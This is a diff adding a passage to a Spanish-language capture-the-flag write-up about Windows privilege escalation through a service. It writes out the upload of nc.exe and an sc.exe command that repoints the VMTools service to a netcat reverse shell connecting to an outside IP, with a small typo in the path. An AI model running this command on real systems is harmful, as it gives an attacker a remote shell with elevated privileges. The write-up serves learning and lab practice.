@@ -116,3 +116,18 @@ Enumeraremos los servicios con el comando
 services
 ```
 
+Viendo un servicio llamado `VMTools`
+
+Podemos ver la forma de la escalada en el siguiente post `https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/`
+
+Para explotarlo lo primero que tenemos que hacer es subir `nc.exe`
+```shell
+upload nc.exe
+```
+
+```shell
+sc.exe config VMTools binPath="C:\tempnc.exe -e cmd.exe 10.10.15.165 1234"
+```
+
+Ahora tendremos que parar el servicio de `VMTools` para que se nos entable nuestra `Reverse Shell`ç
+``
